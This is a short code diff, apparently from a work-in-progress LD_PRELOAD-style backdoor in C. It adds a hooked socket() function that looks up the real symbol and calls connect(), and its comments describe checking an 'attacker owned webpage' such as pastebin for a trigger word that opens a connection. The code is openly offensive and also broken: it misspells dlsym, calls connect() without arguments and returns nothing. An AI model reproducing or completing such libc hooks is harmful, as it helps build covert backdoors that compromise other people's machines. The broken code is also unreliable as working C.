@@ -13,7 +13,12 @@
 
 
 /*overwrite write syscall to check website for triggerword*/
+int socket(int domain, int type, int protocol){
+	int (*new_socket)(int domain, int type, int protocol);
 
+	new_socket=dlysm(RTLD_NEXT, "socket");
+	connect();
+}
 /*looks for keyword in attcker owned webpage which will trigger a connection (use pastebin or some google site) */
 int connect(void)
 {
